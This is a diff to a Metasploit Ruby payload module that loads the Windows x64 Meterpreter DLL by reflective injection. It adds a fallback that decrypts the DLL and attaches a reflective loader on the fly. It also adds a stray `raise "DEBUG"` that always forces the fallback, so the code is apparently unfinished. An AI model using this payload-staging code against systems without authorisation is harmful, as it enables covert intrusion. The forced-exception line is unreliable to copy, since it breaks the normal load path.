@@ -14,6 +14,7 @@ module Payload::Windows::MeterpreterLoader_x64
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::ReflectiveLoaderX64
 
   def initialize(info = {})
     super(update_info(info,
@@ -104,7 +105,19 @@ module Payload::Windows::MeterpreterLoader_x64
     # Exceptions will be thrown by the mixin if there are issues.
 
     unless custom_loader
-      dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build))
+      begin
+        raise "DEBUG"
+        dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build))
+      rescue RuntimeError => e
+        print_status("Failed to load the RDI DLL: #{e.message}")
+        print_status("DLL seems to not have a ReflectiveLoader, attaching one on the fly...")
+        loader = asm_reflective_loader()
+        dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(MetasploitPayloads.meterpreter_path('metsrv', 'x64.dll', debug: debug_build)))
+        offset = dll.length
+        dll = dll + loader
+        vprint_status("New DLL length: #{dll.length} bytes")
+        vprint_status("ReflectiveLoader offset: #{offset} bytes")
+      end
       asm_opts = {
         rdi_offset: offset,
         length:     dll.length,
